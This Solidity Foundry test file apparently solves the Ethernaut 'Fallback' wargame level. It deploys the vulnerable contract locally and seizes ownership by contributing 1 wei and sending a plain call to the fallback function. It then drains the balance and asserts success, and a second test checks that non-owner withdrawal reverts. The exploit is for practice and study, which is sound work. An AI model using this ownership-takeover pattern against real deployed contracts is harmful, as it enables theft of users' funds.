// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/1.sol";

contract FallabackExploit is Test {

    Fallback public target;
    

    function setUp() public {
        target = new Fallback();
        
    }

    function testAttack() public {
        address attacker = address(1993);
        vm.deal(attacker, 10000 ether);
        vm.startPrank(attacker);
        target.contribute{value: 1 wei}();

        (bool success, ) = address(target).call{value:1 wei}("");
        assertTrue(success,"Failed");

        assertEq(target.owner(), attacker);

        target.withdraw();

        vm.stopPrank();

        assertEq(address(target).balance, 0);
    }

    function testWithdrawAsNonOwner() public {
    address notOwner = address(1234);
    vm.startPrank(notOwner);
    vm.expectRevert("caller is not the owner");
    target.withdraw();
    }
}
